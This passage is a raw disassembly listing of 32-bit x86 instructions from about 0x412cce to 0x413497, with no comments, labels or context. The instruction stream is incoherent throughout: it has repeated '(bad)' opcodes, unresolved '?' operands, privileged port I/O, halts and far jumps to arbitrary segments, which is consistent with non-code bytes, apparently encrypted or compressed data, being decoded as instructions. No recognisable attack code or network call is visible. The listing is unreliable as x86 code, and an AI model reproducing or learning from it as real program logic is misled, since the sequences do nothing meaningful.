  412cce:	xchg   esp,eax
  412ccf:	call   0x30f2:0xf55bc647
  412cd6:	sbb    DWORD PTR [ecx-0x41],eax
  412cd9:	pop    ebp
  412cda:	ja     0x412c7a
  412cdc:	into   
  412cdd:	imul   eax,ebx,0x19
  412ce0:	jnp    0x412cdb
  412ce2:	repz mov ds:0xdf192f3c,eax
  412ce8:	lea    ebp,[bp+di]
  412ceb:	loop   0x412cb5
  412ced:	adc    edi,DWORD PTR [ebx+0x48]
  412cf0:	push   esi
  412cf1:	inc    ebp
  412cf2:	les    ecx,FWORD PTR [esi+0x4e3e1ab4]
  412cf8:	pop    ebp
  412cf9:	cwde   
  412cfa:	add    BYTE PTR [ebp-0x7c],bl
  412cfd:	push   edi
  412cfe:	jmp    0x8c5f:0xd47b2d4f
  412d05:	and    al,0xbf
  412d07:	cmp    DWORD PTR [ecx-0x21],eax
  412d0a:	in     eax,0xba
  412d0c:	xchg   esp,eax
  412d0d:	or     DWORD PTR [eax+eiz*1],ebp
  412d10:	sub    edx,DWORD PTR [ebx]
  412d12:	adc    BYTE PTR [esi+0x7c742c02],bl
  412d18:	inc    edi
  412d19:	mov    ah,0x5f
  412d1b:	les    eax,FWORD PTR [ebx]
  412d1d:	mov    edx,0xbd0f8231
  412d22:	popa   
  412d23:	xor    edx,DWORD PTR [edx+0x3b]
  412d26:	stc    
  412d27:	mov    eax,ds:0x521c59ba
  412d2c:	enter  0xb453,0x9f
  412d30:	mov    es,WORD PTR [ebp-0x6f]
  412d33:	rol    DWORD PTR [edx],0x35
  412d36:	inc    ebp
  412d37:	sub    cl,BYTE PTR [ebx-0x40]
  412d3a:	repnz and ch,dl
  412d3d:	(bad)  
  412d3e:	mov    ecx,0x1dfea656
  412d43:	mov    bh,0x58
  412d45:	pop    ss
  412d46:	bnd ret 0xc16e
  412d4a:	pop    es
  412d4b:	mov    esi,0xc6621f80
  412d50:	test   DWORD PTR [edi+0x79],0xccf2b1e7
  412d57:	xor    ah,BYTE PTR [ebp-0x5b]
  412d5a:	(bad)  
  412d5b:	dec    esi
  412d5c:	jecxz  0x412d12
  412d5e:	mov    eax,ds:0x9d350712
  412d63:	mov    ds:0x918a486b,eax
  412d68:	mov    ?,WORD PTR [ebx+ecx*8]
  412d6b:	or     dh,BYTE PTR [ebx]
  412d6d:	and    edi,DWORD PTR cs:[edi+0x76]
  412d71:	ss xor al,0x9e
  412d74:	in     al,0xac
  412d76:	aas    
  412d77:	test   al,0xdc
  412d79:	rcr    DWORD PTR [eax+0x2f8be1c7],cl
  412d7f:	jmp    0x3317:0x15ccde4f
  412d86:	leave  
  412d87:	xor    eax,0x34871ecd
  412d8d:	aam    0x7e
  412d8f:	pop    ss
  412d90:	hlt    
  412d91:	cwde   
  412d92:	not    BYTE PTR [ecx+0x11]
  412d95:	out    dx,eax
  412d96:	test   al,0x71
  412d98:	sbb    DWORD PTR [ebx],esp
  412d9a:	add    eax,0x6bd34954
  412d9f:	mov    ds:0x1481a462,al
  412da4:	rcr    BYTE PTR fs:[esi],1
  412da7:	test   eax,0x395a9483
  412dac:	dec    eax
  412dad:	dec    edx
  412dae:	or     DWORD PTR [eax],edx
  412db0:	cmp    al,0xd4
  412db2:	pop    esi
  412db3:	je     0x412d84
  412db5:	pop    ebp
  412db6:	(bad)  
  412db7:	cmc    
  412db8:	mov    dh,0x91
  412dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dbb:	and    BYTE PTR [eax+eiz*8+0x1a],dl
  412dbf:	sahf   
  412dc0:	mov    ds:0x493e6f1f,al
  412dc5:	jno    0x412d90
  412dc7:	cmp    eax,0x58633d22
  412dcc:	xchg   BYTE PTR [edx],bl
  412dce:	retf   
  412dcf:	push   esp
  412dd0:	xchg   esp,eax
  412dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dd2:	pop    ebp
  412dd3:	test   al,0x4e
  412dd5:	cmp    DWORD PTR [edx+edi*8],0xffffff8d
  412dd9:	mov    esi,0xc076b0fc
  412dde:	push   ebx
  412ddf:	inc    ebx
  412de0:	popf   
  412de1:	and    eax,0x1377f0e6
  412de6:	(bad)  
  412de7:	jmp    0x1cd4:0x892d942
  412dee:	fidivr WORD PTR [ebp-0x71]
  412df1:	cmc    
  412df2:	(bad)  
  412df3:	sahf   
  412df4:	jnp    0x412e41
  412df6:	repnz pushf 
  412df8:	adc    ebx,DWORD PTR [ecx]
  412dfa:	cdq    
  412dfb:	cdq    
  412dfc:	inc    ebx
  412dfd:	dec    edx
  412dfe:	iret   
  412dff:	mov    eax,ds:0xed39e48d
  412e04:	imul   ebp,ebx,0xfffffff7
  412e07:	fisttp QWORD PTR [edx-0x21de0f26]
  412e0d:	and    eax,0xca4467aa
  412e12:	jle    0x412db0
  412e14:	inc    esp
  412e15:	cdq    
  412e16:	cmp    DWORD PTR [ecx+0x24],ebp
  412e19:	or     BYTE PTR [ebx+esi*8+0x50e647dc],bh
  412e20:	add    bh,BYTE PTR [edx]
  412e22:	push   ebx
  412e23:	push   0xc69068f6
  412e28:	nop
  412e29:	push   es
  412e2a:	je     0x412dda
  412e2c:	xchg   DWORD PTR ds:0xa6a9e832,esi
  412e32:	daa    
  412e33:	cs jbe 0x412ea7
  412e36:	into   
  412e37:	sbb    eax,0x4f180191
  412e3c:	inc    ebp
  412e3d:	retf   
  412e3e:	sbb    eax,0x51d62a6f
  412e43:	popa   
  412e44:	leave  
  412e45:	ret    0xec45
  412e48:	outs   dx,BYTE PTR gs:[esi]
  412e4a:	test   eax,edi
  412e4c:	dec    ebx
  412e4d:	xor    ebp,DWORD PTR [eax]
  412e4f:	gs jnp 0x412dfd
  412e52:	mov    ds:0xad721406,al
  412e57:	xchg   ebp,eax
  412e58:	sbb    BYTE PTR [edi-0x67],ah
  412e5b:	and    bh,BYTE PTR fs:[ecx+0x422f1650]
  412e62:	retf   0x4844
  412e65:	mov    edx,0xa56e8294
  412e6a:	stos   BYTE PTR es:[edi],al
  412e6b:	call   FWORD PTR [ebx+eax*8]
  412e6e:	pop    esi
  412e6f:	loop   0x412e8e
  412e71:	mov    ebp,eax
  412e73:	jb     0x412e33
  412e75:	test   al,0xc6
  412e77:	imul   edi,DWORD PTR [ecx-0x41fec469],0x2b133d67
  412e81:	popf   
  412e82:	or     eax,0xa06eaa9e
  412e87:	dec    esp
  412e88:	sub    esp,DWORD PTR [edi-0x5f]
  412e8b:	and    DWORD PTR [ecx+ebx*8-0x658eaec8],0x79
  412e93:	ret    0x84f5
  412e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e97:	add    DWORD PTR [ebx+0x42861848],ebp
  412e9d:	jle    0x412eae
  412e9f:	adc    al,0xd5
  412ea1:	add    al,0x7c
  412ea3:	xchg   esp,eax
  412ea4:	lds    esp,FWORD PTR [esi+0x74]
  412ea7:	sub    eax,0xf53ae144
  412eac:	jae    0x412e4b
  412eae:	scas   eax,DWORD PTR es:[edi]
  412eaf:	iret   
  412eb0:	jno    0x412e68
  412eb2:	jg     0x412e7d
  412eb4:	rcl    BYTE PTR [ecx-0x5dda3eff],cl
  412eba:	(bad)  
  412ebb:	inc    edx
  412ebc:	retf   
  412ebd:	test   al,0x9a
  412ebf:	loop   0x412e6b
  412ec1:	add    BYTE PTR [edx],0x83
  412ec4:	sub    ebp,ecx
  412ec6:	test   DWORD PTR ds:0x4efacdda,esp
  412ecc:	sbb    esi,DWORD PTR [edx]
  412ece:	inc    edi
  412ecf:	or     al,0xb6
  412ed1:	xor    ch,dh
  412ed3:	mov    ds:0x74d40e6,eax
  412ed8:	mov    eax,0xd0fd38e7
  412edd:	push   edx
  412ede:	jns    0x412e62
  412ee0:	mov    ss,ebp
  412ee2:	xchg   edx,eax
  412ee3:	mov    eax,0x2649227
  412ee8:	out    0xbc,al
  412eea:	cmc    
  412eeb:	mov    ebp,0xf3d6f285
  412ef0:	mov    ss,WORD PTR [ebx-0x332d488c]
  412ef6:	scas   eax,DWORD PTR es:[edi]
  412ef7:	lahf   
  412ef8:	fwait
  412ef9:	jnp    0x412e84
  412efb:	out    0xe9,eax
  412efd:	adc    edx,esi
  412eff:	push   esi
  412f00:	sub    bh,dh
  412f02:	ins    DWORD PTR es:[edi],dx
  412f03:	sub    edx,eax
  412f05:	cmp    edi,DWORD PTR [ecx-0x1c]
  412f08:	dec    ecx
  412f09:	not    dl
  412f0b:	mov    esp,esi
  412f0d:	pop    ebp
  412f0e:	dec    dh
  412f10:	adc    DWORD PTR [edx+0x15385e71],ecx
  412f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f17:	outs   dx,BYTE PTR ds:[esi]
  412f18:	dec    ebx
  412f19:	es xchg edi,eax
  412f1b:	push   ecx
  412f1c:	sub    BYTE PTR [esp+eiz*8-0x71f70e61],cl
  412f23:	inc    ebp
  412f24:	cmp    BYTE PTR [esi],dl
  412f26:	and    cl,cl
  412f28:	aad    0x58
  412f2a:	sahf   
  412f2b:	stos   BYTE PTR es:[edi],al
  412f2c:	mov    dh,0xff
  412f2e:	pop    ds
  412f2f:	fnstsw WORD PTR [ecx-0x3751aa94]
  412f35:	mov    DWORD PTR [ecx-0x429ea36d],0xd2f127a2
  412f3f:	call   0x9e591fd7
  412f44:	sub    edx,DWORD PTR [esi-0x3f9ad256]
  412f4a:	xchg   BYTE PTR [edx+edi*1+0xb6168b6],ah
  412f51:	push   edx
  412f52:	mov    DWORD PTR ds:0x4a5f9191,esp
  412f58:	sub    al,0x83
  412f5a:	ret    
  412f5b:	xor    BYTE PTR [esi-0x13879594],dh
  412f61:	xchg   edx,eax
  412f62:	dec    edi
  412f63:	pop    esp
  412f64:	jmp    0x412f8c
  412f66:	mov    ah,0x9
  412f68:	lods   al,BYTE PTR ds:[esi]
  412f69:	pop    esi
  412f6a:	ror    DWORD PTR [edx],1
  412f6c:	in     al,0x19
  412f6e:	(bad)  
  412f6f:	cmp    edi,DWORD PTR [esi+ecx*1-0x2f73c8cc]
  412f76:	inc    ecx
  412f77:	fstp   TBYTE PTR [ecx+0x7a]
  412f7a:	retf   0x432b
  412f7d:	ss stc 
  412f7f:	pusha  
  412f80:	jno    0x412f71
  412f82:	sahf   
  412f83:	jge    0x412fc7
  412f85:	xor    eax,0x17e53ee9
  412f8a:	jnp    0x412fb2
  412f8c:	push   es
  412f8d:	dec    esp
  412f8e:	mov    al,ds:0xfca5fc47
  412f93:	mov    dl,0x51
  412f95:	pop    ss
  412f96:	xchg   ebx,eax
  412f97:	adc    dl,al
  412f99:	in     al,0x48
  412f9b:	inc    ebx
  412f9c:	cmc    
  412f9d:	dec    esi
  412f9e:	xchg   edx,eax
  412f9f:	addr16 pop ds
  412fa1:	push   0x3d
  412fa3:	neg    DWORD PTR [ebp+0x1788c862]
  412fa9:	xor    ebx,eax
  412fab:	test   BYTE PTR [esi+0x2e576baa],al
  412fb1:	fcomp  DWORD PTR [ebx]
  412fb3:	xor    ebx,edx
  412fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fb6:	jnp    0x413011
  412fb8:	(bad)  
  412fb9:	test   al,0x3
  412fbb:	aam    0xa8
  412fbd:	call   0x68c2331c
  412fc2:	in     eax,0x36
  412fc4:	mov    cl,al
  412fc6:	enter  0x4e74,0x56
  412fca:	imul   ebx
  412fcc:	push   edx
  412fcd:	xor    ah,ch
  412fcf:	inc    edi
  412fd0:	ins    DWORD PTR es:[edi],dx
  412fd1:	or     ch,BYTE PTR [edx-0x73]
  412fd4:	retf   
  412fd5:	jp     0x412fa7
  412fd7:	(bad)  
  412fd8:	bound  edx,QWORD PTR [edi]
  412fda:	adc    edi,DWORD PTR [edi-0x60]
  412fdd:	sub    DWORD PTR [edi+ebx*4+0x1f],ecx
  412fe1:	not    BYTE PTR [ebx+ebp*1]
  412fe4:	or     al,0x8a
  412fe7:	popf   
  412fe8:	pop    es
  412fe9:	cmp    eax,0xbcb7cfdc
  412fee:	or     eax,ebx
  412ff0:	inc    edx
  412ff1:	push   eax
  412ff2:	adc    eax,DWORD PTR [esi]
  412ff4:	mov    ds:0x91aaa6ab,eax
  412ff9:	sbb    ecx,DWORD PTR [ecx]
  412ffb:	sub    eax,0x6a234a40
  413000:	aaa    
  413001:	dec    ebp
  413002:	mov    DWORD PTR [esp+ebp*1+0x54dd3dd3],edx
  413009:	xor    DWORD PTR ds:0x4e24b734,0x61
  413010:	mov    bl,0xbd
  413012:	xor    edx,ebp
  413014:	in     al,dx
  413015:	leave  
  413016:	mov    ch,0xea
  413018:	outs   dx,BYTE PTR ds:[esi]
  413019:	repnz inc esp
  41301b:	imul   BYTE PTR [edi]
  41301d:	xor    DWORD PTR [esi+eax*1+0x41],esi
  413021:	sub    eax,DWORD PTR [ecx-0x1871718d]
  413027:	(bad)  
  413028:	fisubr DWORD PTR ds:0x76c13e8c
  41302e:	sub    bl,BYTE PTR [edx+0x7d]
  413031:	mov    al,0x84
  413033:	cmp    ebx,DWORD PTR [ebx+0x410adecb]
  413039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41303a:	pop    esp
  41303b:	jmp    0xf3eb7412
  413040:	pop    ds
  413041:	mov    cl,0x3a
  413043:	mov    ?,ebx
  413045:	loope  0x41304a
  413047:	xchg   esi,eax
  413048:	aaa    
  413049:	xchg   BYTE PTR [ebp+0x666dab1c],dl
  41304f:	imul   edx,DWORD PTR [edi-0x4aa5813a],0xffffff8a
  413056:	xchg   esi,eax
  413057:	std    
  413058:	push   ecx
  413059:	and    al,BYTE PTR [ebx-0x63ec3dee]
  41305f:	inc    edx
  413060:	pushf  
  413061:	push   edx
  413062:	sub    ecx,esp
  413064:	sahf   
  413065:	retf   
  413066:	xchg   BYTE PTR [ebx+0x53],bh
  413069:	rol    cl,0x7
  41306c:	stos   DWORD PTR es:[edi],eax
  41306d:	push   es
  41306e:	ret    0xe2ac
  413071:	sub    BYTE PTR [edi],dh
  413073:	or     esi,edx
  413075:	sub    eax,0x7559bcab
  41307a:	in     eax,dx
  41307b:	fsubr  DWORD PTR [ecx-0x3b]
  41307e:	scas   eax,DWORD PTR es:[edi]
  41307f:	stos   BYTE PTR es:[edi],al
  413080:	sub    al,dl
  413082:	adc    BYTE PTR [edx+0x6ad5c492],al
  413088:	(bad)  
  413089:	(bad)  
  41308a:	mov    BYTE PTR ss:[ecx+0x2a761dd7],0x7c
  413092:	jmp    0x413022
  413094:	js     0x4130fe
  413096:	jns    0x4130a8
  413098:	dec    esp
  413099:	pop    ds
  41309a:	jns    0x413078
  41309c:	mov    ebp,0xb6e218e1
  4130a1:	mov    dh,0xc0
  4130a3:	loope  0x413029
  4130a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130a6:	sbb    esi,DWORD PTR [ebp+edx*8-0x63147df]
  4130ad:	aad    0x1
  4130af:	pusha  
  4130b0:	sbb    al,BYTE PTR [ebx+0x75]
  4130b3:	mov    DWORD PTR [edx+0x34],eax
  4130b6:	mov    al,ds:0xc6cfa34
  4130bb:	inc    ebp
  4130bc:	mov    ebp,0x3479c75a
  4130c1:	repz xchg edx,eax
  4130c3:	jo     0x41308f
  4130c5:	and    BYTE PTR [edi+eiz*2+0x2a6a0f1b],dh
  4130cc:	mov    esp,0xca282254
  4130d1:	and    al,0x1d
  4130d3:	pop    edx
  4130d4:	sub    edx,DWORD PTR [edi+edi*2]
  4130d7:	aam    0x95
  4130d9:	dec    esi
  4130da:	xor    BYTE PTR [edx],0x7b
  4130dd:	jo     0x4130cb
  4130df:	sbb    al,0x7c
  4130e1:	les    ecx,FWORD PTR [ebp-0x53]
  4130e4:	jb     0x4130df
  4130e6:	sub    ebp,edi
  4130e8:	aas    
  4130e9:	add    BYTE PTR [ecx+0x48],dh
  4130ec:	mov    eax,0xe2fbf64f
  4130f1:	adc    eax,0x2cecaba4
  4130f6:	or     al,0xd9
  4130f8:	push   0xffffffc6
  4130fa:	sbb    BYTE PTR [esi-0x6fef124f],ah
  413100:	inc    ebp
  413101:	aad    0x79
  413103:	push   edx
  413104:	jae    0x4130da
  413106:	add    dl,al
  413108:	push   esp
  413109:	shl    DWORD PTR ds:0xff386731,1
  41310f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413110:	push   ebp
  413111:	xchg   ebp,eax
  413112:	xor    dl,BYTE PTR [eax-0x66]
  413115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413116:	enter  0x7e09,0x90
  41311a:	iret   
  41311b:	imul   eax
  41311d:	xlat   BYTE PTR ds:[ebx]
  41311e:	popf   
  41311f:	jle    0x413193
  413121:	rol    al,1
  413123:	push   0x35
  413125:	jl     0x41311e
  413127:	cmp    eax,0x4a104a33
  41312c:	mov    bl,BYTE PTR [ebx-0x6f]
  41312f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413130:	adc    DWORD PTR [ecx+0x58],edx
  413133:	dec    eax
  413134:	cld    
  413135:	mov    ebx,0x8262d52d
  41313a:	and    esp,DWORD PTR [edx+0x69]
  41313d:	cmp    eax,0xb2da012d
  413142:	int3   
  413143:	outs   dx,BYTE PTR ds:[esi]
  413144:	in     eax,dx
  413145:	cmp    eax,0xdfa7474c
  41314a:	sbb    ecx,DWORD PTR [ecx-0x6e]
  41314d:	loope  0x4130d7
  41314f:	fistp  DWORD PTR [ecx]
  413151:	sbb    DWORD PTR [edx+0x12b46d3],0x4b8d7407
  41315b:	mov    edi,0x68d3a0d2
  413160:	mov    ds:0x38cfd12a,al
  413165:	push   eax
  413166:	push   cs
  413167:	arpl   si,si
  413169:	sub    cl,cl
  41316b:	(bad)  
  41316c:	mov    ds:0x780789a3,al
  413171:	not    edi
  413173:	pop    esp
  413174:	scas   eax,DWORD PTR es:[edi]
  413175:	clc    
  413176:	sahf   
  413177:	outs   dx,BYTE PTR ds:[esi]
  413178:	adc    BYTE PTR [edx],0x99
  41317b:	out    0x1d,eax
  41317d:	cs pusha 
  41317f:	jge    0x413129
  413181:	xor    eax,0x582ce920
  413186:	jae    0x413184
  413188:	lods   eax,DWORD PTR ds:[esi]
  413189:	mov    dl,0x28
  41318b:	outs   dx,DWORD PTR ds:[esi]
  41318c:	lahf   
  41318d:	shr    BYTE PTR [edx],cl
  41318f:	ds cmp al,0xcd
  413192:	add    ebp,DWORD PTR [ebx-0x45]
  413195:	xor    BYTE PTR [edx-0x65],bl
  413198:	sub    DWORD PTR [eax+0x13],esi
  41319b:	out    dx,eax
  41319c:	mov    ah,0x14
  41319e:	mov    ebx,0xdeedbca
  4131a3:	inc    ebp
  4131a4:	ret    
  4131a5:	and    al,0xa3
  4131a7:	pop    esi
  4131a8:	in     al,0xce
  4131aa:	loopne 0x4131c3
  4131ac:	(bad)  
  4131ad:	(bad)  
  4131ae:	pop    ecx
  4131af:	iret   
  4131b0:	add    BYTE PTR [edx-0x3a6964f9],al
  4131b6:	shr    bh,0x22
  4131b9:	int3   
  4131ba:	inc    DWORD PTR [ebp-0x5907a4d7]
  4131c0:	or     eax,0x5a4090d3
  4131c5:	push   ss
  4131c6:	test   DWORD PTR ds:0xb784c87a,esp
  4131cc:	mov    esp,0x6e3c4685
  4131d1:	lds    edi,FWORD PTR [edx+0x695a9bd5]
  4131d7:	pop    edi
  4131d8:	inc    ebp
  4131d9:	push   0x63
  4131db:	or     al,0x29
  4131dd:	lods   al,BYTE PTR ds:[esi]
  4131de:	or     al,0x21
  4131e0:	mov    ebx,DWORD PTR ds:0xc3196e19
  4131e6:	fcomp  DWORD PTR [ebx+0x7f082282]
  4131ec:	mov    ebp,0x229aa99f
  4131f1:	mov    ah,0x12
  4131f3:	into   
  4131f4:	push   cs
  4131f5:	ins    BYTE PTR es:[edi],dx
  4131f6:	sub    al,0x56
  4131f8:	cmp    al,0xee
  4131fa:	call   0x9ab4:0xc7cec01b
  413201:	dec    edx
  413202:	cmp    BYTE PTR [edi-0x16],ah
  413205:	xor    DWORD PTR [edx*1-0x39e5aa38],esi
  41320c:	cmp    eax,0xee25c8df
  413211:	icebp  
  413212:	mov    fs,WORD PTR [ebx+0x4]
  413215:	cmp    ecx,DWORD PTR [ebx+0x71]
  413218:	dec    ebp
  413219:	in     eax,dx
  41321a:	mov    al,0x66
  41321c:	mov    ds,ecx
  41321e:	popf   
  41321f:	pusha  
  413220:	cs pop ebp
  413222:	sbb    esi,DWORD PTR [eax+0x1067190b]
  413228:	jle    0x4131c9
  41322a:	push   ebx
  41322b:	adc    ah,cl
  41322d:	adc    ebx,DWORD PTR [esi+0x7f]
  413230:	lds    edi,FWORD PTR [ebx+0x30]
  413233:	aam    0x6f
  413235:	popa   
  413236:	retf   0xefff
  413239:	or     al,0x1e
  41323b:	shl    BYTE PTR [ebx-0x8],1
  41323e:	mov    eax,0xe52f7a54
  413243:	mov    ah,BYTE PTR ds:0x1b3baf47
  413249:	and    al,0xa7
  41324b:	inc    esi
  41324c:	xchg   edi,eax
  41324d:	adc    eax,0x5b000254
  413252:	repz xchg edi,eax
  413254:	dec    eax
  413255:	aad    0x7a
  413257:	aad    0xd5
  413259:	cmp    eax,0xf7f8fce7
  41325e:	mov    bh,0x62
  413260:	out    dx,al
  413261:	cmc    
  413262:	ds pop edx
  413264:	jg     0x413205
  413266:	mov    ecx,0x3b85d88a
  41326b:	xchg   edi,eax
  41326c:	imul   eax,edx,0xffffffff
  41326f:	lock popf 
  413271:	cld    
  413272:	jle    0x41326a
  413274:	dec    esi
  413275:	(bad)  
  413276:	pop    ds
  413277:	adc    BYTE PTR [ebx-0x37f1e293],0x98
  41327e:	sub    BYTE PTR [edi],0xd2
  413281:	(bad)  
  413283:	xchg   esi,eax
  413284:	xchg   DWORD PTR [edi-0x75efabe0],ecx
  41328a:	push   cs
  41328b:	jmp    0xfe58:0x5d2a5e4d
  413292:	xor    al,0x41
  413294:	xchg   DWORD PTR [edx+0x2b8ab784],esi
  41329a:	xor    al,dh
  41329c:	xor    BYTE PTR [ebx],dh
  41329e:	(bad)  
  4132a0:	adc    eax,0x995a72fe
  4132a5:	or     DWORD PTR [esi+0x11],edx
  4132a8:	imul   esp,DWORD PTR [ecx-0x52],0x8bbec53c
  4132af:	je     0x4132e0
  4132b1:	pushf  
  4132b2:	aaa    
  4132b3:	fisub  WORD PTR [edi]
  4132b5:	loopne 0x4132f6
  4132b7:	pop    ebx
  4132b8:	jnp    0x41330c
  4132ba:	jmp    0xfd7e:0xab93f5f3
  4132c1:	ins    BYTE PTR es:[edi],dx
  4132c2:	clc    
  4132c3:	stc    
  4132c4:	cli    
  4132c5:	push   0xc3174a3e
  4132ca:	and    eax,DWORD PTR [ebx+0x39]
  4132cd:	jae    0x413345
  4132cf:	dec    esp
  4132d0:	add    edi,ecx
  4132d2:	pop    edx
  4132d3:	repnz fisubr WORD PTR [esi-0x7a1325ae]
  4132da:	daa    
  4132db:	imul   esi,edi,0x5f
  4132de:	daa    
  4132df:	das    
  4132e0:	fisttp WORD PTR [edi]
  4132e2:	clc    
  4132e3:	sbb    al,cl
  4132e5:	cmp    DWORD PTR [esi+0x60],eax
  4132e8:	inc    ebx
  4132e9:	test   al,al
  4132eb:	mov    ebx,0xc0c09e87
  4132f0:	arpl   bp,si
  4132f2:	inc    ebp
  4132f3:	sbb    eax,0x647e226d
  4132f8:	sahf   
  4132f9:	int3   
  4132fa:	loope  0x41332e
  4132fc:	jmp    0x3fa6f80
  413301:	xor    DWORD PTR [ecx],esp
  413303:	cmp    al,0xd
  413305:	fidiv  DWORD PTR [edx+ecx*4+0x7f]
  413309:	shr    bh,cl
  41330b:	sar    BYTE PTR [edi+0x0],cl
  41330e:	xchg   BYTE PTR [eax],ah
  413310:	fdivrp st(4),st
  413312:	inc    ebx
  413313:	and    eax,0x90e40f0
  413318:	push   eax
  413319:	cmp    BYTE PTR [ecx+0x1092371a],ah
  41331f:	repnz inc eax
  413321:	mov    ss,WORD PTR [edi-0x7e]
  413324:	(bad)  
  413325:	dec    edi
  413326:	jmp    0xb623d7fe
  41332b:	into   
  41332c:	jle    0x41331f
  41332e:	sub    eax,0x327a737
  413333:	cmp    ebp,DWORD PTR [ebx-0x5]
  413336:	les    ecx,FWORD PTR [edi]
  413338:	jnp    0x4132d6
  41333a:	and    DWORD PTR [ecx-0x64503adf],edi
  413340:	(bad)  
  413341:	fisttp WORD PTR [ebx-0x6a]
  413344:	cmp    DWORD PTR [edx],edx
  413346:	sar    dh,0xc6
  413349:	in     al,dx
  41334a:	in     eax,dx
  41334b:	jne    0x4132d2
  41334d:	pop    ebx
  41334e:	add    BYTE PTR [esi],dh
  413350:	inc    BYTE PTR [edi-0x77]
  413353:	and    BYTE PTR [edi+0x2c],cl
  413356:	pop    esp
  413357:	xor    BYTE PTR gs:[eax+0x68],0x52
  41335c:	scas   al,BYTE PTR es:[edi]
  41335d:	xor    al,0x4f
  41335f:	add    ebx,esi
  413361:	(bad)  
  413362:	jl     0x413366
  413364:	lods   al,BYTE PTR ds:[esi]
  413365:	pop    ds
  413366:	mov    esp,DWORD PTR [ebp-0x23]
  413369:	and    esp,DWORD PTR [ecx+0x65]
  41336c:	cs mov edx,0x99f72bc7
  413372:	pop    ebx
  413373:	push   ds
  413374:	pop    ds
  413375:	in     eax,dx
  413376:	add    esi,DWORD PTR [eax-0x41]
  413379:	loop   0x413373
  41337b:	nop
  41337c:	lods   eax,DWORD PTR ds:[esi]
  41337d:	popa   
  41337e:	sub    al,BYTE PTR [esi+0x45]
  413381:	fwait
  413382:	sub    DWORD PTR [esi],ebp
  413384:	cmp    ch,BYTE PTR [ebx]
  413386:	pusha  
  413387:	cld    
  413388:	sti    
  413389:	mov    ?,WORD PTR [edx-0x5b]
  41338c:	(bad)  
  41338d:	fmul   QWORD PTR [edx]
  41338f:	mul    DWORD PTR [ecx]
  413391:	popf   
  413392:	iret   
  413393:	imul   ecx,DWORD PTR [ebp-0x54f2a28c],0x2116701b
  41339d:	cli    
  41339e:	jecxz  0x4133a6
  4133a0:	out    dx,al
  4133a1:	dec    esi
  4133a2:	mov    dl,dh
  4133a4:	push   ebp
  4133a5:	mov    ecx,0xe5a3552e
  4133aa:	gs adc dh,cl
  4133ad:	mov    edx,DWORD PTR [esi+0x1d]
  4133b0:	xchg   ebp,eax
  4133b1:	push   ecx
  4133b2:	jmp    0x413364
  4133b4:	inc    esp
  4133b5:	jmp    0x4481:0xe6fcc09a
  4133bc:	ret    0x41ec
  4133bf:	enter  0xf937,0x7c
  4133c3:	cmp    BYTE PTR [esi+0x246ae790],al
  4133c9:	and    DWORD PTR [ecx+eiz*8+0x5fd6ae20],edi
  4133d0:	jns    0x41340a
  4133d2:	sbb    al,0x5e
  4133d4:	inc    esi
  4133d5:	clc    
  4133d6:	push   eax
  4133d7:	imul   edx,ecx,0xffffffdd
  4133da:	inc    esp
  4133db:	scas   eax,DWORD PTR es:[edi]
  4133dc:	cmp    dl,BYTE PTR [edi+eiz*8]
  4133df:	mov    cl,0x22
  4133e1:	dec    edx
  4133e2:	xchg   DWORD PTR [edx-0xd93f143],esi
  4133e8:	jnp    0x4133e5
  4133ea:	add    al,0x97
  4133ec:	addr16 xchg ebp,eax
  4133ee:	sub    bh,BYTE PTR [esi+0x50a6010a]
  4133f4:	or     al,0x37
  4133f6:	pop    edx
  4133f7:	cli    
  4133f8:	or     dh,cl
  4133fa:	jns    0x41339b
  4133fc:	stos   DWORD PTR es:[edi],eax
  4133fd:	sub    esp,DWORD PTR [eax+0x51]
  413400:	out    dx,al
  413401:	fisttp DWORD PTR [edi+0x8dc2656]
  413407:	mov    bl,0x66
  413409:	stos   DWORD PTR es:[edi],eax
  41340a:	mov    DWORD PTR [eax+0x54],esi
  41340d:	rcr    BYTE PTR [ecx+0x19],0x28
  413411:	push   0xffffffa0
  413413:	dec    eax
  413414:	mov    ch,0x13
  413416:	js     0x413480
  413418:	xchg   edi,eax
  413419:	mul    DWORD PTR [edx-0x11]
  41341c:	rcr    al,1
  41341e:	call   DWORD PTR [esi-0x64ae1832]
  413424:	mov    ecx,0xf65d2c0f
  413429:	dec    esi
  41342a:	push   cs
  41342b:	inc    edx
  41342c:	imul   ecx,DWORD PTR [eax+0x17],0x4df1262e
  413433:	pop    ecx
  413434:	mov    fs,esi
  413436:	mov    cs:0x14742629,al
  41343c:	sbb    ecx,DWORD PTR [ebx]
  41343e:	push   esi
  41343f:	jecxz  0x4133fa
  413441:	enter  0xf2f1,0xda
  413445:	scas   al,BYTE PTR es:[edi]
  413446:	lock adc DWORD PTR [eax],esi
  413449:	sub    DWORD PTR [ebp-0xa],esp
  41344c:	jnp    0x413473
  41344e:	loopne 0x413477
  413450:	xor    edi,DWORD PTR [edi+0x787929a]
  413456:	sbb    edi,esi
  413458:	jno    0x41343d
  41345a:	pusha  
  41345b:	in     al,dx
  41345c:	and    DWORD PTR [ecx],eax
  41345e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41345f:	push   ebx
  413460:	pop    ebp
  413461:	rol    ecx,cl
  413463:	aam    0x19
  413465:	pusha  
  413466:	mov    bh,0x5a
  413468:	sbb    eax,0xececba6e
  41346d:	(bad)  
  41346e:	cmc    
  41346f:	mov    ds,WORD PTR [eax+0x135ee232]
  413475:	xchg   DWORD PTR [ebx+0x13],ebx
  413478:	push   eax
  413479:	pop    ecx
  41347a:	cmp    BYTE PTR [ebx+0x20],dl
  41347d:	imul   edi,eax,0x3197433e
  413483:	sub    DWORD PTR [ebx+0x60],esp
  413486:	or     DWORD PTR [ebp-0x14d97a24],ecx
  41348c:	aaa    
  41348d:	mov    ah,0x1c
  41348f:	into   
  413490:	xchg   ebp,eax
  413491:	xchg   esp,eax
  413492:	ds jmp FWORD PTR gs:[esi-0x37]
  413497:	ret    
